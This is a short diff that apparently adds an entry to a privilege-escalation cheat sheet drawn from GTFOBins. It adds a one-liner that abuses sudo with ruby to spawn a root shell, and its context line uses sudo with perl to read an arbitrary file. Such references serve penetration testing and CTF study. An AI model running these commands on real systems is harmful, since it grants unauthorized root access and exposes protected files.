@@ -62,3 +62,10 @@ https://gtfobins.github.io/gtfobins/perl/#sudo
 ```
 sudo -u $username perl -e 'print `cat $file`'
 ```
+
+```
+sudo ruby -e 'exec "/bin/sh"'
+```
+
+https://gtfobins.github.io/gtfobins/ruby/#sudo
+
